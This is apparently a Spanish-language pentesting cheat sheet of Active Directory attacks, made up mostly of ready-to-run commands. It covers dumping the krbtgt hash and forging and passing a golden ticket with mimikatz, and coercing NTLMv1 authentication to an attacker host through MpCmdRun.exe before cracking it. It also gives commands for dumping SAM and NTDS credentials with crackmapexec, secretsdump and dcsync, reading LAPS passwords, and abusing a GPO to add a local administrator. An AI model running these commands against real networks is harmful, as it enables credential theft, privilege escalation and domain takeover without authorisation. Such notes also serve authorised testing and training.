Este metodo sirve para en vez de guardar el golden ticket en memoria exportarlo y poder usarlo en otras maquinas 

De nuevo antes de crear el ticket necesitamos el hash NTLM  de krbtgt mediante el metodo anterior o solo pidiendo el de krbtgt

``mimikatz # lsadump::lsa /patch``
``mimikatz # lsadump::lsa /inject /name:krbtgt``

Ahora podemos crear el golden tcket añadiendo los datos donde rc4 es el hash NTLM y exportando el ticket a un archivo kirbi
``mimikatz # kerberos::golden /user:fakeuser /domain:test.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /rc4:75b60230a2394a812000dbfad8415965 /ticket:krbtgt.kirbi``

Este ticket ya podriamos pasarlo a cualquier maquina del dominio para realizar una escalada y movimiento lateral importando lo de la siguiente manera

``mimikatz # kerberos::ptt golden.kirbi``

### NTLMv1

Los tokens de autenticación Net-NTLMv1 (NTLMv1) se utilizan para la autenticación de red y usan el cifrado DES el cual esta obsoleto para proteger los hashes NT/LM.

El ataque consistira en obtener uno de esos hashes de uno de los usuarios mediante una callback que podemos hacer con diversas herramientas o vulnerabilidades para capturarlo con el responder.

- PetitPotam
- SpoolSample
- MpCmdRun.exe
Se trata de un binario de Windows Defender y permite realizar escaneos sobre archivos o directorios compartidos por lo que podemos indicarle en la ruta un host remoto el cual sera nuestra maquina atacante que estara escuchando con el responder.

````bash
MpCmdRun.exe -Scan -ScanType 3 -File \\<ip_kali>\test
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/70bdbde4-3b55-4d4d-b946-d94ce1bbf380)

A continuacion debemos crackear este hash, para ello usaremos la herramienta web [cracksh](https://crack.sh/get-cracking/)

1. Primero debemos darle el formato adecuado con la herramienta [multi-ntlmv1](https://github.com/evilmog/ntlmv1-multi)
````bash
python3 ntlmv1.py --ntlmv1 '<hash_ntlmv1>'
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/da33f4bd-2229-4329-952a-e56d83366fa9)

2. Introducimos el token obtenido en cracksh y esta nos mandara el hash de autenticacion valido a un mail.
![image](https://github.com/n3masyst/Pentesting/assets/133997401/23c42d1a-7bac-4405-94b7-95dd12c75afd)

### SAM Dump

- Crackmapexec
````bash
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````
- secretsdump
````bash
# NTDS dump
secretsdump.py -ntds ntds.dit -system system local 

# SAM dump con autenticacion
secretsdump.py domain.local/<usuario>:<password>@<TARGET>
secretsdump.py -hashes :<hashNTLM> 'domain.local/<host>$@<domainname>'
````
- mimikatz
````bash
lsadump::dcsync /domain:test.local /user:Administrator
lsadump::sam
````
- LAPS
````bash
.\SharpLAPS.exe /user:test.local\<user> /pass:<password> /host:127.0.0.1
````
### Grupos de dominio explotables
- DNS Admins
- AD Recycle Bin
### Abuso de GPOs

Primero vamos a enumerar las GPO para ello podemos usar la herramienta [SharpGPOAbuse.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe)

Especificamos que queremos agregar nuestra cuenta de usuario al grupo de administradores locales, pasando nuestro nombre de usuario y pasando la política de grupo a la que tenemos acceso de escritura.
````bash
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
````

Actualizamos las politicas de grupo locales
````bash
net localgroup Administrators
````

